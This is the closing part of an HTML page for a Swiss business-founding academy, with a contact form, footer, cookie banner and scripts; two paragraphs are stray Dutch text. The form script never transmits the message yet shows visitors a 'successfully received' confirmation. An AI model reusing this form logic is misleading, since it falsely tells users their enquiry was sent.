                            <div class="team-box">
                                <div class="team-img-wrap position-relative">
                                    <div class="team-img overflow-hidden">
                                        <img class="w-100" src="assets/images/team/team-4.png" alt="">
                                    </div>
                                    <ul class="custom-ul social-list">
                                        <li>
                                            <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="team-info">
                                    <h4><a href='about.html'>Peter Keller</a></h4>
                                    <p>Rechtsberater</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

           

            <section class="bg_color_offwhite section-padding-top-bottom">
                <div class="container">
                    <div class="row justify-content-center">
                        <div class="col-lg-8">
                            <div class="section-title text-center">
                                <span class="d-inline-block">kontakt aufnehmen</span>
                                <h2 class="h2">Sind Sie bereit, Ihr Unternehmen zu starten?</h2>
                                <p class="mt-24">Neem contact met ons op voor een gratis advies en ontdek welk programma het beste bij jou past..</p>
                            </div>
                            <div class="form-wrapper wrapper-two mt-40">
                                <form id="contactForm" action="#">
                                    <div class="row gy-4">
                                        <div class="col-lg-6">
                                            <input type="text" name="name" placeholder="Vor- und Nachname" required>
                                        </div>
                                        <div class="col-lg-6">
                                            <input type="email" name="email" placeholder="E-Mail-Adresse" required>
                                        </div>
                                        <div class="col-lg-12">
                                            <input type="tel" name="telefon" placeholder="Telefonnummer">
                                        </div>
                                        <div class="col-lg-12">
                                            <select name="interest" required>
                                                <option value="" disabled selected>Interessiert an...</option>
                                                <option value="grundkurs">Grundkurs - Geschäftsgründung</option>
                                                <option value="aufbaukurs">Aufbaukurs - Finanzen & Marketing</option>
                                                <option value="mastergruppe">Mastergruppe - Expertensupport</option>
                                                <option value="beratung">Individuelle Beratung</option>
                                            </select>
                                        </div>
                                        <div class="col-lg-12">
                                            <textarea name="nachricht" placeholder="Ihre Nachricht oder Fragen" rows="4"></textarea>
                                        </div>
                                        <input type="hidden" name="gclid" id="gclid" value="">
                                        <div class="col-lg-12 text-center">
                                            <button type="submit" class="common-btn bg-orange hover-black border-0">
                                                Nachricht senden
                                                <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                                                    <span class="button-primary-hover-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                                                    <span class="button-primary-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                                                </div>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </section>


             <section class="section-padding-bottom bg_color_offwhite">
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-lg-8 text-center">
        <h2 class="h2">Vertrauen von über 50 Partnern in der Schweiz</h2>
        <p class="mt-3">Unsere opleidingen worden erkend door vooraanstaande Schweizer bedrijven en instellingen..</p>
      </div>
    </div>
  </div>
</section>


         

      <footer class="footer-wrap section-padding-top">
        <div class="container">
          <div class="row gy-5 justify-content-between">
            <div class="col-lg-5 wow fadeInUp" data-wow-delay=".1s" data-wow-duration="1">
              <div class="footer-widgets">
                <a href='/'><img src="assets/images/logo-white.png" alt="" style="height: 60px;"></a>
                <p class="footer-desc">Mit über einem Jahrzehnt Erfahrung spezialisieren wir uns auf die Ausbildung angehender Unternehmer und die Begleitung bei der Geschäftsgründung und -führung.</p>
              
              </div>
            </div>
            <div class="col-lg-2 col-sm-6 wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
              <div class="footer-widgets">
                <h5 class="footer-title">Navigation</h5>
                <ul class="custom-ul footer-listing d-flex flex-column">
                  <li><a href='about.html'>Über uns</a></li>
                  <li><a href='courses.html'>Unsere Kurse</a></li>
                  <li><a href='contact.html'>Kontakt</a></li>
                  <li><a href='privacy.html'>Datenschutz</a></li>
                  <li><a href='terms.html'>AGB</a></li>
                </ul>
              </div>
            </div>
            <div class="col-lg-2 col-sm-6 wow fadeInUp" data-wow-delay=".3s" data-wow-duration="1">
              <div class="footer-widgets">
                <h5 class="footer-title">Kurse</h5>
                <ul class="custom-ul footer-listing d-flex flex-column">
                  <li><a href='courses.html'>Grundkurs</a></li>
                  <li><a href='courses.html'>Aufbaukurs</a></li>
                  <li><a href='courses.html'>Mastergruppe</a></li>
                  <li><a href='courses.html'>Bonus-Material</a></li>
                </ul>
              </div>
            </div>
            <div class="col-lg-2 wow fadeInUp" data-wow-delay=".4s" data-wow-duration="1">
              <div class="footer-widgets">
                <h5 class="footer-title">Kontakt</h5>
                <div class="footer-contact-box">
                  <a href="https://maps.app.goo.gl/f6Rz7io36aQuyWc6A" target="_blank">Melchtalerstrasse 8, 6064 Kerns, Schweiz</a>
                  <div class="d-flex flex-column mt-2">
                    <a href="mailto:info@neurofluxmedia.com"><b>info@neurofluxmedia.com</b></a>
                    <a href="tel:+41415551234">+41 41 555 12 34</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="container-fluid section-margin-top border-top">
          <div class="row">
            <div class="col-lg-12 text-center">
              <p class="copy-text">© 2025 Neuroflux Business Akademie. Alle Rechte vorbehalten.</p>
            </div>
          </div>
        </div>
      </footer>

      
      <div id="successModal" class="modal fade" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
          <div class="modal-content">
            <div class="modal-header border-0">
              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body text-center p-4">
              <div class="success-icon mb-4">
                <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <circle cx="40" cy="40" r="40" fill="#FF602F" fill-opacity="0.1"/>
                  <circle cx="40" cy="40" r="30" fill="#FF602F"/>
                  <path d="M30 40L36 46L50 32" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
              </div>
              <h4 class="mb-3">Vielen Dank für Ihre Nachricht!</h4>
              <p class="mb-4">Wir haben Ihre Anfrage erfolgreich erhalten und werden uns innerhalb von 24 Stunden bei Ihnen melden.</p>
              <p class="small text-muted">Sie können dieses Fenster schließen oder auf "OK" klicken.</p>
            </div>
            <div class="modal-footer border-0 justify-content-center">
              <button type="button" class="common-btn bg-orange hover-black border-0" data-bs-dismiss="modal">
                OK
                <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                  <span class="button-primary-hover-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                  <span class="button-primary-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                </div>
              </button>
            </div>
          </div>
        </div>
      </div>
     
      <div id="cookieConsent" class="cookie-consent-banner">
        <div class="cookie-content">
          <div class="cookie-text">
            <h6>Cookie-Einstellungen</h6>
            <p>Wir verwenden Cookies, um Ihnen die beste Erfahrung auf unserer Website zu bieten. Durch die Nutzung unserer Website stimmen Sie der Verwendung von Cookies zu.</p>
          </div>
          <div class="cookie-buttons">
            <button id="acceptCookies" class="common-btn bg-orange hover-black border-0">
              Akzeptieren
              <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                <span class="button-primary-hover-icon button-icon"><i class="ri-check-line"></i></span>
                <span class="button-primary-icon button-icon"><i class="ri-check-line"></i></span>
              </div>
            </button>
            <button id="declineCookies" class="common-btn border-button hover-black">
              Ablehnen
              <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                <span class="button-primary-hover-icon button-icon"><i class="ri-close-line"></i></span>
                <span class="button-primary-icon button-icon"><i class="ri-close-line"></i></span>
              </div>
            </button>
          </div>
        </div>
      </div>
        </div>

        <script src="assets/js/jquery-3.7.1.min.js"></script>
        <script src="assets/js/bootstrap.bundle.min.js"></script>
        <script src="assets/js/swiper-bundle.min.js"></script>
        <script src="assets/js/jquery.magnific-popup.min.js"></script>
        <script src="assets/js/wow.min.js"></script>

        <script src="assets/js/odometer.min.js"></script>
        <script src="assets/js/viewport.jquery.js"></script>

        <script src="assets/js/menu.js"></script>
        <script src="assets/js/jquery.mixitup.min.js"></script>

        <script src="assets/js/main.js"></script>

        <script>
        function getGclidFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('gclid') || '';
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            const gclid = getGclidFromUrl();
            const gclidField = document.getElementById('gclid');
            if (gclidField && gclid) {
                gclidField.value = gclid;
            }
        });

        document.getElementById('contactForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const gclid = formData.get('gclid');
            
         
            
            const submitButton = this.querySelector('button[type="submit"]');
            const originalText = submitButton.innerHTML;
            
            submitButton.innerHTML = 'Wird gesendet...';
            submitButton.disabled = true;
            
            setTimeout(() => {
                submitButton.innerHTML = originalText;
                submitButton.disabled = false;
                
                this.reset();
                
                const gclidField = document.getElementById('gclid');
                if (gclidField) {
                    gclidField.value = getGclidFromUrl();
                }
                
                const modal = new bootstrap.Modal(document.getElementById('successModal'));
                modal.show();
            }, 1500);
        });
        </script>

        <script>
        document.addEventListener('DOMContentLoaded', function() {
            const cookieConsent = document.getElementById('cookieConsent');
            const acceptBtn = document.getElementById('acceptCookies');
            const declineBtn = document.getElementById('declineCookies');
            
            if (cookieConsent && acceptBtn && declineBtn && !localStorage.getItem('cookieConsent')) {
                cookieConsent.style.display = 'block';
            }
            
            if (acceptBtn) {
                acceptBtn.addEventListener('click', function() {
                    localStorage.setItem('cookieConsent', 'accepted');
                    if (cookieConsent) {
                        cookieConsent.style.display = 'none';
                    }
                });
            }
            
            if (declineBtn) {
                declineBtn.addEventListener('click', function() {
                    localStorage.setItem('cookieConsent', 'declined');
                    if (cookieConsent) {
                        cookieConsent.style.display = 'none';
                    }
                });
            }
        });
        </script>
    </body>
</html>